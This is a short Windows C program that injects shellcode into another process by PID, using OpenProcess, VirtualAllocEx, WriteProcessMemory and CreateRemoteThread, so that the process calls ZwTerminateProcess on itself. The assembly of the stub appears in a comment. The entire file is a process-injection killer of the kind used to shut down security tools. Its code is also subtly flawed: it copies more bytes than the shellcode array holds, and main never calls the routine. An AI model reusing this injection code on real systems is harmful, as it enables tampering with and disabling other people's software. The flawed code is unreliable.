#include <stdio.h>
#include <windows.h>


char shellcode[] = {
    "\x6A\x00\x6A\xFF\xE8\x01\x00\x00\x00\xC3\xB8\x01\x01\x00\x00\xE8\x00\x00\x00\x00\x8B\xD4\x0F\x34\xC3"
};

void ProcKill(DWORD pid)
{
    char code[0x20];
    memcpy(code, shellcode, 0x20);

    HMODULE h = GetModuleHandle("NTDLL.DLL");
    FARPROC p = GetProcAddress(h, "ZwTerminateProcess");
    memcpy((char*)(code + 0x0B), (char*)((char*)p + 1), 4);

    // Once we have set up our shellcode we use open process to operate on its virtual memory
    HANDLE hProc = 0;
    hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid);

    LPVOID hRemoteMem = VirtualAllocEx(hProc, NULL, 0x20, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    DWORD numBytesWritten;
    WriteProcessMemory(hProc, hRemoteMem, code, 0x20, &numBytesWritten);

    HANDLE hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)hRemoteMem, 0, 0, NULL);

    CloseHandle(hProc);
}

int main(int argc, CHAR* argv[])
{

    DWORD shellcode_size = 0x20;
    DWORD syscall_number_offset = 0x0B;

    /*
        PUSH 0
        PUSH -1
        CALL 00193693
        RET
        TERM:
        MOV EAX,101
        CALL 0019369D
        MOV EDX,ESP
        SYSENTER
        RET
    */

    return 0;
}
